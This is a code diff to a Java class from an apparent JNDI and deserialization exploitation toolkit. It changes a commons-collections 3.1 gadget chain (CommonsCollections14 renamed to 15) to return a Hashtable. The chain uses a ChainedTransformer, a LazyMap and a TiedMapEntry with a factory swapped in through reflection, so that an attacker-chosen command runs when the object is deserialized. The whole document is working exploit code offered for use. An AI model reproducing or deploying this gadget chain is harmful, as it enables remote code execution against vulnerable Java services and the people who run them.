@@ -1,5 +1,4 @@
-package com.qi4l.jndi.gadgets;
-
+import com.qi4l.jndi.gadgets.ObjectPayload;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -12,23 +11,23 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import java.util.HashMap;
+import java.util.Hashtable;
 import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.Unam4})
-public class CommonsCollections14 implements ObjectPayload<Object> {
+public class CommonsCollections15 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
         Transformer transformerChain = new ChainedTransformer(transformers);
         Map decorate = LazyMap.decorate(new HashMap(), new ConstantFactory(1));
+
         TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,1);
-        HashMap hashMap = Gadgets.maskmapToString(tiedMapEntry, tiedMapEntry);
+        Hashtable hashtable = Gadgets.makeTableTstring(tiedMapEntry);
         Reflections.setFieldValue(decorate, "factory",transformerChain );
         Reflections.setFieldValue(tiedMapEntry, "key",233);
-
-        return hashMap;
+        return hashtable;
     }
-
 }
